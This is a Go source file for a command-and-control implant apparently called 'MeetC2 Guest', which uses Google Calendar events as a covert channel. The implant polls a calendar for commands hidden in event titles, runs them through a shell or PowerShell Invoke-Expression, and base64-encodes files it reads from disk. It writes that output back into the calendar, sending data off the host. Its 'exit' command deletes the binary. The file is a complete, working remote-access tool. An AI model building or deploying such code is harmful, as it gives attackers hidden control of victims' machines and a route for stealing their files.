package main

import (
	"context"
	_ "embed"
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
	"time"

	"golang.org/x/oauth2/google"
	"google.golang.org/api/calendar/v3"
	"google.golang.org/api/option"
)

var (
	embedCredentials string
	embedCalendarID  string
)

//go:embed credentials.json
var embeddedCredsFile []byte

type Guest struct {
	service       *calendar.Service
	calendarID    string
	commandPrefix string
	hostname      string
}

func main() {
	log.SetFlags(log.Ltime)
	
	var credData []byte
	var calendarID string

	if len(embeddedCredsFile) > 0 && embedCalendarID != "" {
		credData = embeddedCredsFile
		calendarID = embedCalendarID
	} else if embedCredentials != "" && embedCalendarID != "" {
		decoded, err := base64.StdEncoding.DecodeString(embedCredentials)
		if err != nil {
			log.Fatal("Failed to decode embedded credentials")
		}
		credData = decoded
		calendarID = embedCalendarID
	} else {
		log.Fatal("No embedded credentials found")
	}

	guest, err := NewGuest(credData, calendarID)
	if err != nil {
		log.Fatalf("Failed to initialize: %v", err)
	}
	
	log.Printf("MeetC2 Guest started on %s", guest.hostname)
	log.Printf("Calendar ID: %s", guest.calendarID)
	log.Printf("Polling every 10 seconds...")

	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	guest.CheckAndExecute()

	for {
		select {
		case <-ticker.C:
			guest.CheckAndExecute()
		case <-sigChan:
			return
		}
	}
}

func NewGuest(credData []byte, calendarID string) (*Guest, error) {
	ctx := context.Background()

	config, err := google.JWTConfigFromJSON(credData, calendar.CalendarScope)
	if err != nil {
		return nil, err
	}

	client := config.Client(ctx)
	service, err := calendar.NewService(ctx, option.WithHTTPClient(client))
	if err != nil {
		return nil, err
	}

	hostname, _ := os.Hostname()

	return &Guest{
		service:       service,
		calendarID:    calendarID,
		commandPrefix: "Meeting from nobody:",
		hostname:      hostname,
	}, nil
}

func (g *Guest) CheckAndExecute() {
	now := time.Now()
	timeMin := now.Format(time.RFC3339)
	timeMax := now.Add(24 * time.Hour).Format(time.RFC3339)

	events, err := g.service.Events.List(g.calendarID).
		ShowDeleted(false).
		SingleEvents(true).
		TimeMin(timeMin).
		TimeMax(timeMax).
		OrderBy("startTime").
		Do()

	if err != nil {
		log.Printf("Error listing events: %v", err)
		return
	}

	for _, event := range events.Items {
		if !strings.HasPrefix(event.Summary, g.commandPrefix) {
			continue
		}

		if strings.Contains(event.Description, fmt.Sprintf("[OUTPUT-%s]", g.hostname)) {
			continue
		}

		cmd := strings.TrimPrefix(event.Summary, g.commandPrefix)
		cmd = strings.TrimSpace(cmd)
		
		targetHost := ""
		actualCmd := cmd
		
		if strings.HasPrefix(cmd, "@") {
			parts := strings.SplitN(cmd, ":", 2)
			if len(parts) == 2 {
				targetHost = strings.TrimPrefix(parts[0], "@")
				actualCmd = parts[1]
				
				// Skip if not targeted to this host
				if targetHost != "" && targetHost != g.hostname && targetHost != "*" {
					continue
				}
			}
		}

		output := g.ExecuteCommand(actualCmd, event.Description)
		g.UpdateEventWithOutput(event.Id, output)
	}
}

func (g *Guest) ExecuteCommand(command, args string) string {

	hostInfo := fmt.Sprintf("[Host: %s]\n", g.hostname)
	log.Printf("Executing command: %s", command)
	
	switch command {
	case "whoami":
		user := os.Getenv("USER")
		if user == "" {
			user = os.Getenv("USERNAME") // Windows
		}
		if user == "" {
			user = "unknown"
		}
		return hostInfo + fmt.Sprintf("User: %s\nHostname: %s\nOS: %s/%s",
			user, g.hostname, runtime.GOOS, runtime.GOARCH)

	case "pwd":
		dir, _ := os.Getwd()
		return hostInfo + dir

	case "upload":
		filepath := strings.TrimSpace(args)
		data, err := os.ReadFile(filepath)
		if err != nil {
			return hostInfo + fmt.Sprintf("Error: %v", err)
		}
		encoded := base64.StdEncoding.EncodeToString(data)
		return hostInfo + fmt.Sprintf("File: %s\n[DATA]\n%s\n[/DATA]", filepath, encoded)

	case "exit":
		go func() {
			time.Sleep(2 * time.Second)
			os.Remove(os.Args[0])
			os.Exit(0)
		}()
		return hostInfo + "Terminating..."

	default:
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {

			psCommand := g.prepareWindowsCommand(command)
			cmd = exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command", psCommand)
		} else {
			cmd = exec.Command("sh", "-c", command)
		}

		output, err := cmd.CombinedOutput()
		if err != nil {
			return hostInfo + fmt.Sprintf("Error: %v\n%s", err, string(output))
		}
		return hostInfo + string(output)
	}
}

func (g *Guest) prepareWindowsCommand(command string) string {

	command = strings.TrimSpace(command)
	
	if strings.Contains(command, "../") {
		command = strings.ReplaceAll(command, "../", "..\\")
	}
	if strings.Contains(command, "./") {
		command = strings.ReplaceAll(command, "./", ".\\")
	}
	
	switch {
	case strings.HasPrefix(command, "ls"):
		if command == "ls" {
			return "Get-ChildItem"
		}
		args := strings.TrimPrefix(command, "ls")
		args = strings.TrimSpace(args)
		if args != "" {
			return fmt.Sprintf("Get-ChildItem %s", args)
		}
		return "Get-ChildItem"
		
	case strings.HasPrefix(command, "cat "):

		file := strings.TrimPrefix(command, "cat ")
		file = strings.TrimSpace(file)
		return fmt.Sprintf("Get-Content '%s'", file)
		
	case strings.HasPrefix(command, "ps"):

		if command == "ps" {
			return "Get-Process"
		}
		return "Get-Process"
		
	case strings.HasPrefix(command, "cd "):

		path := strings.TrimPrefix(command, "cd ")
		path = strings.TrimSpace(path)

		path = strings.Trim(path, "\"'")
		return fmt.Sprintf("Set-Location '%s'; Get-Location", path)
		
	case command == "pwd":
		return "Get-Location"
		
	default:

		escaped := strings.ReplaceAll(command, "'", "''")
		

		if strings.ContainsAny(command, "|;&") {
			return escaped
		}
		
		return fmt.Sprintf("Invoke-Expression '%s'", escaped)
	}
}

func (g *Guest) UpdateEventWithOutput(eventID, output string) error {
	event, err := g.service.Events.Get(g.calendarID, eventID).Do()
	if err != nil {
		return err
	}

	event.Description = fmt.Sprintf("%s\n\n[OUTPUT-%s]\n%s\n[/OUTPUT-%s]",
		event.Description, g.hostname, output, g.hostname)
	event.ColorId = "11"

	_, err = g.service.Events.Update(g.calendarID, eventID, event).Do()
	if err != nil {
		log.Printf("Failed to update event: %v", err)
	} else {
		log.Printf("Successfully updated event with output")
	}
	return err
}
